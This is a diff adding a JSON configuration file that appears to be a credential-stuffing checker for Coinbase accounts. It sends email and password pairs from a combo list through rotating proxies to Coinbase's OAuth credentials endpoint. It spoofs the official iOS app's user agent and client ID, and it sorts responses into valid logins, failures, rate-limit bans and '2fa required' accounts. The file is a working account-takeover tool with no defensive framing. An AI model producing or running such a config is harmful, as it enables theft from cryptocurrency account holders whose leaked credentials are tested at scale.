@@ -1,0 +1,27 @@
+{
+    "General": {
+        "name": "Coinbase",
+        "proxyType": "Proxies",
+        "comboType": "Email"
+    },
+    "Requests": [
+        {
+            "actionUrl": "https:\/\/www.coinbase.com\/oauth\/authorize\/with_credentials",
+            "method": "POST",
+            "userAgent": "Coinbase\/3.0.11 (com.vilcsak.bitcoin2; build:6368; iOS 10.3.3) Alamofire\/4.5.1",
+            "contentType": "application\/x-www-form-urlencoded",
+            "postData": "client_id=6011662b0badfa97f9fed5a246526277ff2116affa98cfaacacd012a191ba38d&password=<PASS>&redirect_uri=2_legged&scope=all&username=<USER>",
+            "successKeys": [
+                "{\"success\":true,\"code\":\""
+            ],
+            "failureKeys": [
+                "incorrect_credentials",
+                "2fa_required"
+            ],
+            "banKeys": [
+                "{\"success\":false,\"error\":\"rate_limited\"}"
+            ],
+            "staticReturn": "Probably has 2fa"
+        }
+    ]
+}
